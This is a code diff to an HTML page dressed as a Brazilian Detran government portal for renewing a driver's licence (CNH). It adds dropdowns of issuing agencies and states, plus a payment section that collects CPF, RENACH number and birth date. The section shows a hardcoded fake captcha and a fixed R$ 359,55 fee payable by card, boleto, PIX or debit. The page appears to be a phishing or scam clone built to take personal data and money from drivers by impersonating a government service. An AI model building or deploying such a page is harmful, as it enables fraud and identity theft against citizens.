@@ -343,12 +343,36 @@
                             <div class="detran-col-left">
                                 <div class="detran-field">
                                     <label><strong>Tipo de Documento:</strong></label>
-                                    <select style="width: 140px; color: #aaa;"><option>IDENTIDADE</option></select>
+                                    <select style="width: 140px; color: #aaa;"><option>IDENTIDADE</option>
+                                    <option value="width: 140px; color: #aaa;">CNH</option></select>
                                     <span style="color: red;">*</span>
                                 </div>
                                 <div class="detran-field">
                                     <label><strong>Órgão Emissor:</strong></label>
-                                    <select style="width: 140px;"><option></option></select>
+                                    <select required>
+                                        <option value="" disabled selected></option>
+                                        <option value="SNJ">SNJ - SECRETARIA NACIONAL DA JUSTIÇA</option>
+                                        <option value="SPSP">SPSP - SEC POLICIA SEG PUBLICA</option>
+                                        <option value="SPTC">SPTC - SUPERINT. DE POLICIA TEC-CIENTIFICA</option>
+                                        <option value="SRDPF">SRDPF - SUPERINT REG DEPTO DA POL FEDERAL</option>
+                                        <option value="SRF">SRF - SUPERINT. RECEITA FEDERAL</option>
+                                        <option value="SRTE">SRTE - SUP REGIONAL DO TRABALHO E EMPREGO</option>
+                                        <option value="SSDC">SSDC - SEC. DE SEG. DEFESA E CIDADANIA</option>
+                                        <option value="SSDS">SSDS - SEC DA SEGURANCA E DA DEFESA SOCIAL</option>
+                                        <option value="SSI">SSI - SEC DE SEGURANCA E INFORMACOES</option>
+                                        <option value="SSIPT">SSIPT - SECRETARIA SEG INT PUBLICA</option>
+                                        <option value="SSP">SSP - SECRETARIA DE SEGURANCA PUBLICA</option>
+                                        <option value="SSPCGP">SSPCGP - SEC DA SEG PUBLICA COOD G PERICIAS</option>
+                                        <option value="SSPDC">SSPDC - SSP E DEFESA DO CIDADAO</option>
+                                        <option value="SSPDS">SSPDS - SEC SEG PUBLICA E DEFESA SOCIAL</option>
+                                        <option value="SSPO">SSPO - DE SEG. PUBLICA DE ÓRGÃOS</option>
+                                        <option value="TJ">TJ - TRIBUNAL DE JUSTICA</option>
+                                        <option value="TRE">TRE - TRIBUNAL REGIONAL ELEITORAL</option>
+                                        <option value="TRT">TRT - TRIBUNAL REGIONAL DO TRABALHO</option>
+                                        <option value="TSE">TSE - TRIBUNAL SUPERIOR ELEITORAL</option>
+                                        <option value="TST">TST - TRIBUNAL SUPERIOR DO TRABALHO</option>
+                                        <option value="MREX">MREX - MINISTERIO DAS RELACOES EXTERIORES</option>
+                                    </select>
                                     <span style="color: red;">*</span>
                                 </div>
                             </div>
@@ -362,18 +386,45 @@
                                 </div>
                                 <div class="detran-field" style="justify-content: flex-start;">
                                     <label><strong>UF Emissão:</strong></label>
-                                    <select style="width: 50px;"><option></option></select>
+                                    <select required>
+                                        <option value="" disabled selected></option>
+                                        <option value="AC">AC</option>
+                                        <option value="AL">AL</option>
+                                        <option value="AM">AM</option>
+                                        <option value="AP">AP</option>
+                                        <option value="BA">BA</option>
+                                        <option value="CE">CE</option>
+                                        <option value="DF">DF</option>
+                                        <option value="ES">ES</option>
+                                        <option value="GO">GO</option>
+                                        <option value="MA">MA</option>
+                                        <option value="MG">MG</option>
+                                        <option value="MS">MS</option>
+                                        <option value="MT">MT</option>
+                                        <option value="PA">PA</option>
+                                        <option value="PB">PB</option>
+                                        <option value="PE">PE</option>
+                                        <option value="PI">PI</option>
+                                        <option value="PR">PR</option>
+                                        <option value="RJ">RJ</option>
+                                        <option value="RN">RN</option>
+                                        <option value="RO">RO</option>
+                                        <option value="RR">RR</option>
+                                        <option value="RS">RS</option>
+                                        <option value="SC">SC</option>
+                                        <option value="SE">SE</option>
+                                        <option value="SP">SP</option>
+                                        <option value="TO">TO</option>
+                                    </select>
                                     <span style="color: red;">*</span>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
-                    <div class="detran-footer-top">
-                        Confirmação de Pessoalidade (captcha)
+                    <div class="detran-footer-top">    
                     </div>
                     <div class="detran-footer-bottom">
-                        <a href="#" class="wpp-icon">📞</a>
                         <form action="#home" style="margin: 0; width: auto;">
                             <button type="submit" class="detran-btn-confirm">
                                 <span style="font-size: 0.8rem;">✓</span> Confirmar
@@ -391,6 +442,82 @@
             </form>
         </main>
     </section>
+    <body>
 
+        <section id="pagamento-section">
+            <header class="header-internal">
+                <div class="icon-box-static">
+                    <div class="icon-car"></div>
+                </div>
+                <div class="header-text">
+                    <h1>NOSSOS SERVIÇOS</h1>
+                    <p>RENOVAÇÃO DE CNH:</p>
+                </div>
+            </header>    
+    
+        <main class="area-principal">
+            <div class="alerta-instrucao">
+                FAÇA O PAGAMENTO, E ESPERE O RESULTADO DA SOLICITAÇÃO PELO SITE DO DETRAN
+            </div>
+    
+            <div class="card-detran">
+                <div class="topo-detran">
+                    <img src="unnamed.png" alt="Detran" class="logo-detran">
+                    <div class="gov-br">Portal do Governo</div>
+                </div>
+    
+                <h2 class="titulo-pagamento">Pagamento da 2ª Via da CNH</h2>
+    
+                <div class="conteudo-form">
+                    <fieldset class="secao-dados">
+                        <legend>Dados do Solicitante</legend>
+                        <div class="input-group">
+                            <label>CPF:</label>
+                            <input type="text" required>
+                        </div>
+                        <div class="input-group">
+                            <label>RENACH:</label>
+                            <input type="text" required>
+                        </div>
+                        <div class="input-group">
+                            <label>Data de Nascimento:</label>
+                            <input type="text" required>
+                        </div>
+                        <div class="linha-dado">
+                            <strong>Código de Verificação:</strong> 
+                            <span class="captcha">7V8BK</span>
+                            <input type="text" placeholder="Digite o código" class="input-captcha">
+                        </div>
+                    </fieldset>
+    
+                    <fieldset class="secao-dados">
+                        <legend>Detalhes da Solicitação</legend>
+                        <p><strong>Serviço:</strong> 2ª Via da CNH</p>
+                        <p><strong>Motivo:</strong> Perda do Documento</p>
+                        <p><strong>Taxa:</strong> <span class="azul-destaque">R$ 359,55</span></p>
+                        <p><strong>Prazo de Entrega:</strong> 7 a 10 dias úteis</p>
+                    </fieldset>
+    
+                    <div class="pagamento-container">
+                        <h3>Escolha a Forma de Pagamento</h3>
+                        <div class="grid-pagamento">
+                            <input type="radio" name="metodo" id="card" hidden>
+                            <label for="card" class="item-pagamento">💳<br>Pagar com Cartão</label>
+    
+                            <input type="radio" name="metodo" id="boleto" hidden>
+                            <label for="boleto" class="item-pagamento">📋<br>Gerar Boleto</label>
+    
+                            <input type="radio" name="metodo" id="pix" hidden checked>
+                            <label for="pix" class="item-pagamento">✨<br>Pagar com PIX</label>
+    
+                            <input type="radio" name="metodo" id="debito" hidden>
+                            <label for="debito" class="item-pagamento">🏦<br>Débito em Conta</label>
+                        </div>
+                    </div>
+    
+                    <button class="btn-confirmar">Confirmar Pagamento</button>
+                </div>
+            </div>
+        </main>
 </body>
 </html>
